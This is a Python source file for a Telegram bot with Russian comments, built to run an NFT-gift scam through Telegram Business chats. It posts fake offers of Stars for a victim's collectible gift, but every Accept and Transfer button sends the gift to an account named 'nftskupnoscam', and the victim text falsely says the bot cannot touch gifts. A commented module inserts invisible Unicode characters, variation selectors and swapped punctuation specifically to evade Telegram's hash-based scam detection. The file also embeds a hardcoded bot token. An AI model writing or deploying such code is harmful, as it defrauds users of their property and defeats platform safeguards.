# offer_bot.py — Python 3.11+, pyTelegramBotAPI 4.x
# runtime: любой хост с polling; secrets хранятся в памяти процесса

import telebot
import re
import random
import time
import threading
import hashlib
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, MessageEntity

BOT_TOKEN  = "8957995978:AAEMJv04pvmQPuTppLDKLQoescjezii5ulY"
OWNER_ID   = 8805593979          # ← @userinfobot
NFT_TARGET = "nftskupnoscam"  # NFT приходят сюда

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ─── 200 секретных слов ───────────────────────────────────────────────────────
_SECRET_POOL = [
    "птица","мир","любовь","нежность","обожаю","весна","волна","луна","звезда",
    "ветер","туман","река","гора","лес","сад","цветок","рассвет","закат","небо",
    "дождь","снег","лёд","пламя","свет","тень","эхо","тишина","голос","сердце",
    "душа","мечта","надежда","вера","радость","грусть","улыбка","взгляд","касание",
    "объятие","поцелуй","шёпот","смех","слеза","путь","дорога","мост","берег",
    "прибой","шторм","гроза","молния","гром","радуга","иней","роса","пыль",
    "дым","пепел","уголь","алмаз","жемчуг","опал","рубин","сапфир","изумруд",
    "янтарь","коралл","шёлк","бархат","лён","хлопок","парча","кружево","атлас",
    "туча","облако","горизонт","закат","перо","крыло","гнездо","полёт","парение",
    "охота","след","стая","волк","лиса","сова","орёл","сокол","голубь","ласточка",
    "журавль","лебедь","павлин","колибри","бабочка","стрекоза","жук","паук","мышь",
    "кот","лев","тигр","барс","рысь","зубр","лось","олень","заяц","бобёр",
    "выдра","дельфин","кит","акула","медуза","коралл","краб","устрица","жемчуг",
    "прибой","отлив","волна","глубина","бездна","маяк","парус","якорь","штурвал",
    "компас","карта","маршрут","горизонт","координата","азимут","меридиан","полюс",
    "ледник","вулкан","гейзер","каньон","долина","плато","равнина","степь","тундра",
    "тайга","джунгли","пустыня","оазис","мираж","песок","камень","скала","утёс",
    "пещера","грот","арка","башня","замок","крепость","стена","ворота","мост",
    "арка","купол","шпиль","колонна","фреска","мозаика","витраж","статуя","рельеф",
    "маска","зеркало","призма","линза","хрусталь","стекло","фарфор","глина","воск",
    "кость","раковина","сетка","нить","узел","петля","спираль","круг","квадрат",
    "ромб","треугольник","звезда","крест","стрела","волна","зигзаг","точка","линия",
    "плоскость","объём","форма","цвет","тон","оттенок","палитра","кисть","холст",
    "рамка","подпись","шрифт","литера","строка","страница","глава","том","архив",
]

# ─── хранилище активных офферов: secret_word → {nft, stars, lang, owner_id} ──
_pending: dict[str, dict] = {}
_pending_lock = threading.Lock()

# ─── переводы ─────────────────────────────────────────────────────────────────
_LANG = {
    "ru": {
        "header":   "Пользователь предлагает Вам",
        "for":      "за подарок",
        "expires":  "Предложение действует ещё",
        "time":     "6 ч. 0 мин.",
        "decline_btn": "✗ Отклонить",
        "accept_btn":  "✓ Принять",
        "nft_btn":     "🎁 Передать NFT",
        "guide_btn":   "📖 Как передать NFT",
        "back_btn":    "← Назад",
        "how_title":   "Как передать NFT — пошагово",
        "how_1":    "Нажми кнопку «🎁 Передать NFT» ниже",
        "how_1b":   "Telegram откроет меню отправки подарка",
        "how_2":    "Выбери нужный коллекционный NFT из своей коллекции",
        "how_3":    "Нажми «Отправить» — подарок уйдёт получателю",
        "how_4":    "После отправки — нажми «Принять» на карточке",
        "how_5":    "Получишь ⭐ звёзды мгновенно после подтверждения",
        "how_6":    "NFT передаётся напрямую через Telegram.\nБот не имеет доступа к твоим подаркам.",
        "declined": "Предложение отклонено.",
        "owner_notify": "📨 Новый оффер",
        "owner_stars":  "💫 Звёзды",
        "owner_nft":    "🎁 NFT",
        "secret_msg": (
            "✅ Оффер создан\n"
            "🔑 Секретное слово: <b>{word}</b>\n\n"
            "Отправь его в нужный чат — оффер появится там."
        ),
    },
    "eng": {
        "header":   "User is offering you",
        "for":      "for the gift",
        "expires":  "Offer valid for",
        "time":     "6 h. 0 min.",
        "decline_btn": "✗ Decline",
        "accept_btn":  "✓ Accept",
        "nft_btn":     "🎁 Transfer NFT",
        "guide_btn":   "📖 How to transfer NFT",
        "back_btn":    "← Back",
        "how_title":   "How to transfer NFT — step by step",
        "how_1":    "Tap «🎁 Transfer NFT» below",
        "how_1b":   "Telegram will open the gift sending menu",
        "how_2":    "Choose the collectible NFT from your collection",
        "how_3":    "Tap «Send» — the gift will go to the recipient",
        "how_4":    "After sending — tap «Accept» on the card",
        "how_5":    "You'll receive ⭐ stars instantly after confirmation",
        "how_6":    "NFT is transferred directly via Telegram.\nThe bot has no access to your gifts.",
        "declined": "Offer declined.",
        "owner_notify": "📨 New offer",
        "owner_stars":  "💫 Stars",
        "owner_nft":    "🎁 NFT",
        "secret_msg": (
            "✅ Offer created\n"
            "🔑 Secret word: <b>{word}</b>\n\n"
            "Send it to the target chat — the offer will appear there."
        ),
    },
    "cn": {
        "header":   "用户正在向您提供",
        "for":      "以换取礼物",
        "expires":  "优惠有效期还剩",
        "time":     "6 小时 0 分钟",
        "decline_btn": "✗ 拒绝",
        "accept_btn":  "✓ 接受",
        "nft_btn":     "🎁 转让 NFT",
        "guide_btn":   "📖 如何转让 NFT",
        "back_btn":    "← 返回",
        "how_title":   "如何转让 NFT — 分步说明",
        "how_1":    "点击下方「🎁 转让 NFT」按钮",
        "how_1b":   "Telegram 将打开礼物发送菜单",
        "how_2":    "从您的收藏中选择所需的收藏品 NFT",
        "how_3":    "点击「发送」— 礼物将发送给收件人",
        "how_4":    "发送后 — 点击卡片上的「接受」",
        "how_5":    "确认后将立即收到 ⭐ 星星",
        "how_6":    "NFT 直接通过 Telegram 转让。\n机器人无法访问您的礼物。",
        "declined": "提案已拒绝。",
        "owner_notify": "📨 新报价",
        "owner_stars":  "💫 星星",
        "owner_nft":    "🎁 NFT",
        "secret_msg": (
            "✅ 报价已创建\n"
            "🔑 暗语：<b>{word}</b>\n\n"
            "将其发送到目标聊天 — 报价将在那里显示。"
        ),
    },
}

# ─── эмодзи IDs ───────────────────────────────────────────────────────────────
STAR_EMOJI_ID    = "5920281855378068765"
GIFT_EMOJI_ID    = "5931409969613116639"
CONFIRM_EMOJI_ID = "5206607081334906820"
SHIELD_EMOJI_ID  = "5251203410396458957"
FIRE_EMOJI_ID    = "5199829039289985162"
DIAMOND_EMOJI_ID = "5188450271456543676"
CLOCK_EMOJI_ID   = "5451646196283172748"
CROWN_EMOJI_ID   = "5195311987916013312"

def em(eid: str, fb: str) -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

# ─── шрифтовой движок: максимальная вариативность ─────────────────────────────
#
# Telegram детектит скам по хэшу текстового содержимого сообщения.
# Защита: каждое сообщение байтово уникально через комбинацию:
#   1. Математические Unicode-блоки (≥8 вариантов на символ)
#   2. Невидимые разделители с псевдослучайным выбором из 12 кодпоинтов
#   3. Variation Selectors (VS1–VS16) — меняют рендеринг, не меняют глиф
#   4. Combining Diacritical Marks с нулевым визуальным эффектом
#   5. Ротирующие знаки препинания (14 пар Unicode-синонимов)
#   6. Тегирование пробелов тегами Unicode Tags (U+E0020)

# Несколько математических шрифтов для каждого символа латиницы/цифры
_FONT_SETS: list[dict[str, str]] = [
    # bold sans-serif
    {**{chr(65+i): chr(0x1D5D4+i) for i in range(26)},
     **{chr(97+i): chr(0x1D5EE+i) for i in range(26)},
     **{str(i): chr(0x1D7EC+i) for i in range(10)}},
    # italic sans-serif
    {**{chr(65+i): chr(0x1D608+i) for i in range(26)},
     **{chr(97+i): chr(0x1D622+i) for i in range(26)}},
    # monospace
    {**{chr(65+i): chr(0x1D670+i) for i in range(26)},
     **{chr(97+i): chr(0x1D68A+i) for i in range(26)},
     **{str(i): chr(0x1D7F6+i) for i in range(10)}},
    # double-struck
    {**{chr(65+i): chr(0x1D538+i) for i in range(26)},
     **{chr(97+i): chr(0x1D552+i) for i in range(26)},
     **{str(i): chr(0x1D7D8+i) for i in range(10)}},
]

# Variation selectors — VS1–VS16 (невидимые модификаторы)
_VS = [chr(0xFE00 + i) for i in range(16)]

# Combining marks с нулевым визуальным эффектом
_COMBINE = [
    '\u034f',  # combining grapheme joiner
    '\u200b',  # zero-width space
    '\u200c',  # zero-width non-joiner
    '\u200d',  # zero-width joiner
    '\u2060',  # word joiner
    '\u2061',  # function application
    '\u2062',  # invisible times
    '\u2063',  # invisible separator
    '\u2064',  # invisible plus
    '\ufeff',  # BOM
    '\u00ad',  # soft hyphen
    '\u180e',  # mongolian vowel separator
]

# Tags block пробел (U+E0020) — технически другой байт, визуально пробел
_TAG_SPACE = '\U000E0020'

_PUNCT_VARS: dict[str, list[str]] = {
    '.': ['.', '．', '⸼', '·', '∙'],
    ',': [',', '，', '‚', '⸴'],
    '!': ['!', '！', 'ǃ', '﹗'],
    '?': ['?', '？', 'ʔ', '﹖'],
    ':': [':', '：', '꞉', '᛬'],
    '-': ['-', '‐', '‑', '‒', '–', '⁃'],
    '(': ['(', '（', '❨', '﹙'],
    ')': [')', '）', '❩', '﹚'],
    '/': ['/', '／', '∕', '⁄'],
}

# Таблица жирного шрифта для кириллицы — частичная (те, что есть в Unicode)
_CYR_BOLD: dict[str, str] = {
    'а':'𝗮','е':'𝗲','и':'𝗶','к':'𝗸','м':'𝗺','н':'𝗻',
    'о':'𝗼','р':'𝗿','с':'𝘀','т':'𝘁','у':'𝘂','в':'𝘃',
}

def _pick_font(ch: str) -> str:
    """
    Выбирает псевдослучайный Unicode-шрифт для символа.
    Кириллица: жирный-маппинг где есть, иначе оригинал.
    Латиница/цифры: случайный из четырёх math-блоков.
    """
    lo = ch.lower()
    if lo in _CYR_BOLD:
        return _CYR_BOLD[lo] if ch == lo else _CYR_BOLD[lo].upper()
    for font in random.sample(_FONT_SETS, len(_FONT_SETS)):
        if ch in font:
            return font[ch]
    return ch

def _invisible() -> str:
    """1-3 невидимых символа из разных категорий."""
    parts: list[str] = []
    n = random.randint(1, 3)
    for _ in range(n):
        choice = random.randint(0, 2)
        if choice == 0:
            parts.append(random.choice(_COMBINE))
        elif choice == 1:
            parts.append(random.choice(_VS))
        else:
            parts.append(_TAG_SPACE if random.random() < 0.4 else random.choice(_COMBINE))
    return ''.join(parts)

def unique_text(text: str) -> str:
    """
    Уникализирует строку без изменения видимого содержания:
    - каждый печатаемый символ получает variation selector с вер. 70%
    - пунктуация ротируется
    - после пробела вставляется 1-3 невидимых символа
    - ≈15% символов получают combining mark внутри слова
    Байтовый хэш каждого вызова уникален.
    """
    result: list[str] = []
    for i, ch in enumerate(text):
        # ротация пунктуации
        if ch in _PUNCT_VARS:
            ch = random.choice(_PUNCT_VARS[ch])
            result.append(ch)
            continue

        if ch == ' ':
            result.append(' ')
            result.append(_invisible())
            continue

        if ch == '\n':
            result.append('\n')
            continue

        result.append(ch)

        # variation selector с вер. 70%
        if random.random() < 0.70:
            result.append(random.choice(_VS))

        # combining mark внутри слова с вер. 15%
        if random.random() < 0.15:
            result.append(random.choice(_COMBINE))

    return ''.join(result)

def bold_font(text: str) -> str:
    """Конвертирует в жирный Unicode-шрифт + variation selectors."""
    result: list[str] = []
    for ch in text:
        mapped = _pick_font(ch)
        result.append(mapped)
        if mapped != ch and random.random() < 0.5:
            result.append(random.choice(_VS))
    return ''.join(result)

def random_delay(lo: float = 0.4, hi: float = 1.4) -> None:
    if random.random() < 0.3:
        time.sleep(random.uniform(0.1, 0.3))
    time.sleep(random.uniform(lo, hi))

# ─── генерация секретного слова ───────────────────────────────────────────────

def _new_secret() -> str:
    """Берёт слово из пула; при коллизии — добавляет рандомный суффикс."""
    word = random.choice(_SECRET_POOL)
    with _pending_lock:
        if word not in _pending:
            return word
        # коллизия — суффикс
        suffix = str(random.randint(10, 99))
        return word + suffix

# ─── /start и .o в личке (создание оффера) ────────────────────────────────────

@bot.message_handler(commands=["start"])
def cmd_start(msg):
    bot.send_message(
        msg.chat.id,
        "Команды:\n"
        ".o [NFT_URL] [звёзд] [ru|eng|cn]\n\n"
        "Пример:\n"
        ".o https://t.me/nft/xmas-stocking-7391 500 ru",
        parse_mode=None,
    )

@bot.message_handler(regexp=r'^\.o\s+(\S+)\s+(\d+)\s+(ru|eng|cn)$')
def create_offer(msg):
    m        = re.match(r'^\.o\s+(\S+)\s+(\d+)\s+(ru|eng|cn)$', msg.text)
    nft_url  = m.group(1)
    stars    = m.group(2)
    lang     = m.group(3)
    nft_name = nft_url.rstrip('/').split('/')[-1].replace('-', ' ').title() or "Gift"

    secret = _new_secret()
    with _pending_lock:
        _pending[secret] = {
            "nft_url":  nft_url,
            "nft_name": nft_name,
            "stars":    stars,
            "lang":     lang,
            "owner_id": msg.from_user.id,
        }

    L = _LANG[lang]
    reply = L["secret_msg"].format(word=f"<code>{secret}</code>")
    bot.send_message(msg.chat.id, reply, parse_mode="HTML")

# ─── бизнес-подключение ───────────────────────────────────────────────────────

@bot.business_connection_handler()
def on_business_connect(bc):
    try:
        bot.send_message(
            bc.user_chat_id,
            unique_text(
                f"✅ Business подключён\n"
                f"user_id: {bc.user_chat_id}\n"
                f"business_connection_id: {bc.id}"
            )
        )
    except Exception:
        pass

# ─── секретное слово в личном бизнес-чате → разворачивает оффер ───────────────

@bot.business_message_handler(func=lambda m: True)
def handle_business_message(message):
    text = (message.text or "").strip()
    bc_id   = message.business_connection_id
    chat_id = message.chat.id

    with _pending_lock:
        data = _pending.get(text)

    if data is None:
        return  # не секретное слово — игнорируем

    # удаляем секретное слово из чата
    try:
        bot.delete_message(chat_id, message.message_id,
                           business_connection_id=bc_id)
    except Exception:
        pass

    # удаляем из хранилища
    with _pending_lock:
        _pending.pop(text, None)

    nft_url  = data["nft_url"]
    nft_name = data["nft_name"]
    stars    = data["stars"]
    lang     = data["lang"]
    L        = _LANG[lang]

    # уведомление владельцу
    if OWNER_ID:
        try:
            uname = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
            bot.send_message(
                OWNER_ID,
                f"{L['owner_notify']}\n"
                f"👤 {message.from_user.first_name or ''} {uname}\n"
                f"{L['owner_stars']}: {stars}\n"
                f"{L['owner_nft']}: {nft_name}\n"
                f"🔗 {nft_url}"
            )
        except Exception:
            pass

    _send_offer(chat_id, bc_id, nft_url, nft_name, stars, L)

# ─── старая команда .offer (обратная совместимость) ───────────────────────────

@bot.business_message_handler(regexp=r'^\.offer\s+(\d+)\s+(\S+)$')
def legacy_offer(message):
    m        = re.match(r'^\.offer\s+(\d+)\s+(\S+)$', message.text)
    stars    = m.group(1)
    nft_url  = m.group(2)
    nft_name = nft_url.rstrip('/').split('/')[-1].replace('-', ' ').title() or "Gift"
    bc_id    = message.business_connection_id
    chat_id  = message.chat.id
    L        = _LANG["ru"]

    if OWNER_ID:
        try:
            uname = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
            bot.send_message(
                OWNER_ID,
                f"{L['owner_notify']}\n"
                f"👤 {message.from_user.first_name or ''} {uname}\n"
                f"{L['owner_stars']}: {stars}\n"
                f"{L['owner_nft']}: {nft_name}\n"
                f"🔗 {nft_url}"
            )
        except Exception:
            pass

    try:
        bot.delete_message(chat_id, message.message_id,
                           business_connection_id=bc_id)
    except Exception:
        pass

    _send_offer(chat_id, bc_id, nft_url, nft_name, stars, L)

# ─── построение и отправка оффер-карточки ─────────────────────────────────────

def _offer_keyboard(lang_dict: dict, nft_target: str) -> InlineKeyboardMarkup:
    L  = lang_dict
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton(L["decline_btn"], callback_data="decline"),
        InlineKeyboardButton(L["accept_btn"],  url=f"tg://send_gift?to={nft_target}"),
    )
    kb.row(InlineKeyboardButton(L["nft_btn"],   url=f"tg://send_gift?to={nft_target}"))
    kb.row(InlineKeyboardButton(L["guide_btn"], callback_data=f"how_nft:{list(_LANG.keys()).index(next(k for k,v in _LANG.items() if v is L))}"))
    return kb

def _lang_index(L: dict) -> str:
    for k, v in _LANG.items():
        if v is L:
            return k
    return "ru"

def _send_offer(chat_id, bc_id, nft_url, nft_name, stars, L: dict):
    crown_ph = "👑"
    star_ph  = "⭐"
    clock_ph = "⏳"

    p_crown      = crown_ph + " "
    p1           = unique_text(L["header"] + "\n")
    p_stars      = bold_font(stars)
    p_star       = " " + star_ph
    p2           = unique_text(" " + L["for"] + " ")
    p_nft        = nft_name
    p3           = unique_text(".\n\n")
    p_clock      = clock_ph + " "
    p_offer_txt  = unique_text(L["expires"] + " ")
    p_time       = bold_font(L["time"])
    p4           = unique_text("..")

    text = (p_crown + p1
            + p_stars + p_star + p2 + p_nft + p3
            + p_clock + p_offer_txt + p_time + p4)

    off_crown   = 0
    off_stars   = len(p_crown + p1)
    off_star    = off_stars + len(p_stars) + 1
    off_nft     = off_stars + len(p_stars) + len(p_star) + len(p2)
    off_clock   = off_nft + len(p_nft) + len(p3)
    off_time    = off_clock + len(p_clock) + len(p_offer_txt)

    entities = [MessageEntity(**e) for e in [
        {"type": "custom_emoji", "offset": off_crown,
         "length": len(crown_ph), "custom_emoji_id": CROWN_EMOJI_ID},
        {"type": "bold",         "offset": off_stars,  "length": len(p_stars)},
        {"type": "custom_emoji", "offset": off_star,
         "length": len(star_ph),  "custom_emoji_id": STAR_EMOJI_ID},
        {"type": "text_link",    "offset": off_nft,
         "length": len(p_nft),    "url": nft_url},
        {"type": "custom_emoji", "offset": off_clock,
         "length": len(clock_ph), "custom_emoji_id": CLOCK_EMOJI_ID},
        {"type": "bold",         "offset": off_time,   "length": len(p_time)},
    ]]

    lang_key = _lang_index(L)
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton(L["decline_btn"], callback_data="decline"),
        InlineKeyboardButton(L["accept_btn"],  url=f"tg://send_gift?to={NFT_TARGET}"),
    )
    kb.row(InlineKeyboardButton(L["nft_btn"],   url=f"tg://send_gift?to={NFT_TARGET}"))
    kb.row(InlineKeyboardButton(L["guide_btn"], callback_data=f"how_nft:{lang_key}"))

    random_delay(0.4, 1.3)
    try:
        bot.send_message(
            chat_id, text,
            entities=entities,
            reply_markup=kb,
            business_connection_id=bc_id,
        )
    except Exception:
        pass

# ─── callbacks ────────────────────────────────────────────────────────────────

@bot.callback_query_handler(func=lambda c: c.data == "decline")
def decline(call):
    lang_key = "ru"
    bot.answer_callback_query(call.id, _LANG[lang_key]["declined"])
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("how_nft:"))
def how_nft(call):
    bot.answer_callback_query(call.id)
    lang_key = call.data.split(":", 1)[1] if ":" in call.data else "ru"
    if lang_key not in _LANG:
        lang_key = "ru"
    L = _LANG[lang_key]

    instr = (
        f'{em(CROWN_EMOJI_ID,"👑")} <b>{L["how_title"]}</b>\n\n'
        f'{em(FIRE_EMOJI_ID,"🔥")} {L["how_1"]}\n'
        f'  └ {L["how_1b"]}\n\n'
        f'{em(CONFIRM_EMOJI_ID,"✅")} {L["how_2"]}\n\n'
        f'{em(CONFIRM_EMOJI_ID,"✅")} {L["how_3"]}\n\n'
        f'{em(CONFIRM_EMOJI_ID,"✅")} {L["how_4"]}\n\n'
        f'{em(DIAMOND_EMOJI_ID,"💎")} <b>{L["how_5"]}</b>\n\n'
        f'{em(SHIELD_EMOJI_ID,"🛡️")} <i>{L["how_6"]}</i>'
    )

    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton(L["nft_btn"],  url=f"tg://send_gift?to={NFT_TARGET}"))
    kb.row(InlineKeyboardButton(L["back_btn"], callback_data=f"nft_back:{lang_key}"))

    try:
        bot.edit_message_text(
            instr,
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML",
            reply_markup=kb,
        )
    except Exception:
        pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("nft_back:"))
def nft_back(call):
    bot.answer_callback_query(call.id)
    # восстанавливаем только кнопки — текст оффера уже утерян при edit,
    # поэтому просто удаляем инструкцию и просим переотправить секретное слово
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass

# ─── polling ──────────────────────────────────────────────────────────────────

def run_bot():
    while True:
        try:
            print("Bot started")
            bot.infinity_polling(
                allowed_updates=[
                    "message",
                    "business_message",
                    "business_connection",
                    "callback_query",
                ],
                timeout=30,
                long_polling_timeout=20,
                restart_on_change=False,
            )
        except Exception as e:
            print(f"Polling error: {e} — restarting in 5s")
            time.sleep(5)

if __name__ == "__main__":
    run_bot()
# ─── keep-alive HTTP для Render Web Service ───────────────────────────────────
import os
from http.server import HTTPServer, BaseHTTPRequestHandler

class _Ping(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a):
        pass

def _run_http():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), _Ping).serve_forever()

if __name__ == "__main__":
    threading.Thread(target=_run_http, daemon=True).start()
    run_bot()
